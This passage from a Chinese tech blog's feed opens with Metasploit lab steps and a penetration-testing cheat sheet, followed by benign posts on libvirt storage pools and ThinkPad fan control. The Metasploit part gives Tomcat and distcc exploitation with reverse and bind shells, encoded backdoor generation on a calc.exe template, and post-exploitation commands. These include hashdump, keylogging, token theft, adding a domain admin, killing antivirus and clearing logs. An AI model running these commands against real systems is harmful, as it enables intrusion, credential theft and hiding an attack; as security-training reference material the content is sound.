style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">search tomcat_mgr_login</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set rhosts 172.16.32.162</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set threads 50</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set rport 8180</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set verbose false</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">use multi/http/tomcat_mgr_deploy</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set password tomcat</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set username tomcat</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set rhost 172.16.32.162</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set lport 9999</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set rport 8180</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload linux/x86/shell_bind_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">search distcc_exec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload linux/x86/shell_reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set lhost 172.16.32.129</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set rhost 172.16.32.162</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show payloads</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload cmd/unix/reverse</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="十五常用命令备忘">十五．常用命令备忘<a class="hash-link" href="#十五常用命令备忘" title="标题的直接链接">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="msfconsole--commands">MSFconsole  Commands<a class="hash-link" href="#msfconsole--commands" title="标题的直接链接">​</a></h3><ul><li>show exploits 查看所有exploit</li><li>show payloads 查看所有payload</li><li>show auxiliary 查看所有auxiliary</li><li>search name 搜索exploit等</li><li>info 查看加载模块的信息</li><li>use name 加载模块</li><li>LHOST 本机IP</li><li>RHOST 目标IP</li><li>set function 设置选项值</li><li>setg function  全局设置</li><li>show options 查看选项</li><li>show targets 查看exp可选的平台</li><li>set target num 设置exp作用平台</li><li>set payload payload  设置payload</li><li>show advanced 查看高级选项</li><li>set autorunscript migrate -f 设置自动执行指令</li><li>check 测试是否可利用</li><li>exploit 执行exp或模块</li><li>exploit  -j 作为后台执行</li><li>exploit  -z 成功后不立即打开session</li><li>exploit  -e encoder 指定encoder</li><li>exploit  -h  查看帮助信息</li><li>sessions  -l -v 列出可用sessions详细信息</li><li>sessions  -s script 在指定session执行脚本</li><li>sessions -K 结束session</li><li>sessions -c cmd 执行指定命令</li><li>sessions -u sessionID 升级shell</li><li>db_create name 创建数据库</li><li>db_connect name   连接数据库</li><li>db_nmap nmap扫描并导入结果</li><li>db_autopwn -h      查看autopwn帮助</li><li>db_autopwn -p -r -e 基于端口，反弹shell</li><li>db_destroy 删除数据库</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="meterpreter-commands">Meterpreter Commands<a class="hash-link" href="#meterpreter-commands" title="标题的直接链接">​</a></h3><ul><li>help 查看帮助</li><li>run scriptname 运行脚本</li><li>sysinfo 系统基本信息</li><li>ls 列目录</li><li>use priv 运行提权组件</li><li>ps 列进程</li><li>migrate PID PID迁移</li><li>use incognito token窃取</li><li>list_tokens -u 查看可用用户token</li><li>list_tokens -g 查看可用组token</li><li>impersonate_token DOMAIN_NAME<!-- -->\<!-- -->USERNAME 模仿token</li><li>steal_token PID 窃取PID所属token并模仿</li><li>drop_token 停止模仿token</li><li>getsystem 获取SYSTEM权限</li><li>shell 运行shell</li><li>execute -f cmd.exe -i 交互式运行cmd</li><li>execute -f cmd.exe -i -t 使用可用token运行</li><li>execute -f cmd.exe -i -H -t 同上，同时隐藏进程</li><li>rev2self 返回至初始用户</li><li>reg command 修改注册表</li><li>setkesktop number 切换至另一已登录用户屏幕</li><li>screenshot 截屏</li><li>upload file 上传文件</li><li>download file  下载文件</li><li>keyscan_start 开始截取击键记录</li><li>keyscan_stop 停止截取击键记录</li><li>getprivs 尽可能提升权限</li><li>uictl enable keyboard/mouse 获取键盘或鼠标的控制权</li><li>background 将当前meterpreter shell转入后台</li><li>hashdump 导出所有用户hash</li><li>use sniffer 加载嗅探模块</li><li>sniffer_interfaces 查看可用网卡接口</li><li>sniffer_dump interfaceID pcapname 开始嗅探</li><li>sniffer_start interfaceID packet-buffer 指定buffer范围嗅探</li><li>sniffer_stats interfaceID   抓取统计信息</li><li>sniffer_stop interfaceID  停止嗅探</li><li>add_user username password -h ip 添加用户</li><li>add_group_user "Domain Admins" username -h ip 添加用户至管理组</li><li>clearev 清空日志</li><li>timestomp 改变文件属性如创建时间等</li><li>reboot 重启</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="msfpayload-commands">MSFpayload Commands<a class="hash-link" href="#msfpayload-commands" title="标题的直接链接">​</a></h3><ul><li>msfpayload -h 查看帮助</li><li>msfpayload windows/meterpreter/bind_tcp 0 查看指定payload可用选项</li><li>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 X &gt; payload.exe 生成payload.exe</li><li>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 R &gt; payload.raw 保存为RAW格式，可用于msfencode</li><li>msfpayload windows/meterpreter/bind_tcp LPORT=443 C &gt; payload.c 保存为C格式</li><li>msfpayload windows/meterpreter/bind_tcp LPORT=443 J &gt; payload.java 保存为java格式</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="msfencode-commands">MSFencode Commands<a class="hash-link" href="#msfencode-commands" title="标题的直接链接">​</a></h3><ul><li>msfencode -h 查看帮助</li><li>msfencode -l 查看可用encoder</li><li>msfencode -t (c,elf.exe,java.js_le,js_be,perl,raw,ruby,vba,vbs,loop-vbs,asp,war,macho) 以指定格式显示编码后的buffer</li><li>msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5 -t exe 生成编码后的exe</li><li>msfencode -i payload.raw BufferRegister=ESI -e x86/alpha_mixed -t c 生成纯字符格式C类型shellcode</li><li>msfpayload windows/meterpreter/bind_tcp LPORT=443 R | \
msfencode -e x86/countdown -c 5 -t raw | \
msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded.exe 多编码器结合，多次编码</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="msfcli-commands">MSFcli Commands<a class="hash-link" href="#msfcli-commands" title="标题的直接链接">​</a></h3><ul><li><code>msfcli | grep exploit</code> 只显示exploit</li><li><code>msfcli | grep exploit/windows</code> 只显示windows exploit</li><li><code>msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=443 RHOST=172.16.32.26 E</code> 针对指定IP加载指定exp并设定payload</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="msfninjafu">MSF,Ninja，Fu<a class="hash-link" href="#msfninjafu" title="标题的直接链接">​</a></h3><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">* msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 R | msfencode -x calc.exe -k -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe 使用calc.exe作为模板，生成经过编码的后门</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">* msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 R | msfencode -x calc,exe -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe 与上面差不多，只是执行的时候不依赖于生成的可执行文件，且不会有任何提示信息</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">* msfpayload windows/meterpreter/bind_tcp LPORT=443 R | msfencode -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe &amp;&amp; msfcli multi/hanler PAYLOAD=windows/meterpreter/bind_tcp LPORT=443 E 生成编码后的payload并开始监听本机端口</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="msfvenom">MSFvenom<a class="hash-link" href="#msfvenom" title="标题的直接链接">​</a></h3><ul><li>msfvenom --payload 自动生成payload</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="meterpreter-post-exploitation-commands">Meterpreter Post Exploitation Commands<a class="hash-link" href="#meterpreter-post-exploitation-commands" title="标题的直接链接">​</a></h3><p>提权一般步骤</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; use priv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; getsystem</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; ps </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; steal_token 1784</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; shell</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net user msf msf /add /DOMAIN</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net group "Domain Admins" msf /add /DOMAIN</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>获取hash一般步骤</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; use priv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; getsystem</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; hashdump</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>如果是在win2008系统上：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run migrate</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run killav</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; ps </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; migrate 1436</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; keyscan_start</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; keyscan_dump</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; keyscan_stop</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>使用Incognito提权</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; use incognito</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; list_tokens -u</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; use priv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; getsystem</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; list_tokens -u</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; impersonate_token IHAZSECURITY\\Administrator</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>查看保护机制并禁用之</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run getcountermeasure</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run getcountermeasure -h</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run getcountermeasure -d -k</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ul><li>meterpreter&gt; run checkvm 检查是否是虚拟机</li><li>meterpreter&gt; shell 转入命令行</li><li>meterpreter&gt; run vnc 远程VNC控制</li><li>meterpreter&gt; background 转入后台</li><li>meterpreter&gt; run post/windows/escalate/bypassuac 执行Bypass UAC</li><li>meterpreter&gt; run post/osx/gather/hashdump 在OS X系统上dump hash</li><li>meterpreter&gt; run post/linux/gather/hashdump 在Linux 系统上dump hash</li></ul>]]></content>
        <category label="msf" term="msf"/>
        <category label="security" term="security"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[libvirt中storage pool的管理]]></title>
        <id>/2012/07/13/libvirt-storage-pool</id>
        <link href="https://itxx00.github.io/notes/blog/2012/07/13/libvirt-storage-pool"/>
        <updated>2012-07-13T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[build storage pool with libvirt]]></summary>
        <content type="html"><![CDATA[<blockquote><p>简单演示如何在libvirt中创建storage pool</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><p>libvirt提供了存储管理的功能，可以管理的存储类型有 目录  lvm逻辑卷 磁盘 iscsi存储  scsi存储  mpath netfs等，这里以最基本的目录类型为例</p><p>基本概念：</p><p>在libvirt里保存虚拟机磁盘镜像的目录或设备称作存储池  即pool  ，每个虚拟机所使用的虚拟磁盘镜像称作卷 即vol ，vol是存储在pool里面的。</p><p>我们可以使用命令行的virsh工具来管理，pool有两种基本状态：活动和非活动，查看当前存储池的状态</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">virsh # pool-list --all </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Name State Autostart </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-----------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">default inactive yes </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">disk active yes</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>新建一个基于目录的存储池bigpool 存储路径为 /bigpool </p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">virsh # pool-define-as bigpool dir - - - - /bigpool</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Pool bigpool defined</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>这时候pool仅仅是定义出来了，可以用pool-list --all查看到。但是相应的目录是不存在的，接着需要建立这个pool</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">virsh # pool-build bigpool</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Pool bigpool built</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>这个时候才是真正的建立起这个pool，libvirt会自动创建/bigpool目录，并设置相应的权限，如果你有用selinux作为libvirt的安全措施的话它还能自动设置上下文</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># ls -Zld /bigpool/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">drwx------ 2 ? root root 4096 Jul 13 12:54 /bigpool/</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>我这里由于没有使用selinux所以没有上下文的</p><p> pool创建好之后就可以启动了</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">virsh # pool-start bigpool</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Pool bigpool started</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">virsh # pool-list --all </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Name State Autostart </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-----------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bigpool active no </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">default inactive yes </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">disk active yes</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>还可以设置pool为自动启动</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">virsh # pool-autostart bigpool</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Pool bigpool marked as autostarted</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">virsh # pool-list --all </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Name State Autostart </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-----------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bigpool active yes </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">default inactive yes </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">disk active yes</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>基于目录的一个存储池就这样建立完成了，是不是很简单？</p>]]></content>
        <category label="libvirt" term="libvirt"/>
        <category label="storage pool" term="storage pool"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[如何让ThinkPad自定义风扇转速]]></title>
        <id>/2012/05/21/thinkpad-fan-speed-control</id>
        <link href="https://itxx00.github.io/notes/blog/2012/05/21/thinkpad-fan-speed-control"/>
        <updated>2012-05-21T00:00:00.000Z</updated>
        <content type="html"><![CDATA[<blockquote><p>笔记本长期处于高强度高负荷工作状态，手放到出风口的时候差点被烫伤，再不调整下恐怕到了夏天是彻底扛不住了。于是网上搜了下资料，还好thinkpad一直都有黑客在用...</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><p>还好thinkpad一直都有黑客在用，因此也不缺乏内核级别的支持，下面记录下配置方法，怕今后再要捣鼓的时候忘记。首先thinkpad有一个专用的acpi驱动叫thinkpad_acpi的内核模块，这个在centos里面已经自带了，它的项目地址<a href="http://ibm-acpi.sf.net/%E3%80%82%E4%B8%8A%E9%9D%A2%E6%9C%89%E5%88%97%E5%87%BA%E6%94%AF%E6%8C%81%E5%93%AA%E4%BA%9B%E5%93%AA%E4%BA%9B%E5%9E%8B%E5%8F%B7%E5%93%AA%E4%BA%9B%E5%8A%9F%E8%83%BD%E3%80%82" target="_blank" rel="noopener noreferrer">http://ibm-acpi.sf.net/。上面有列出支持哪些哪些型号哪些功能。</a></p><p>你可以通过lsmod命令查看是否已经加载了此模块:</p><p><code>lsmod|grep think</code></p><p>这个模块加载之后可以通过proc内的文件来查看风扇的运行状态：</p><p><code>cat /proc/acpi/ibm/fan</code></p><p>如果有，那么进入下一步，添加模块的加载选项，创建模块配置文件：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[root@server ~]# vi /etc/modprobe.d/thinkpad_acpi.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[root@server ~]# cat /etc/modprobe.d/thinkpad_acpi.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">options thinkpad_acpi experimental=1 fan_control=1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 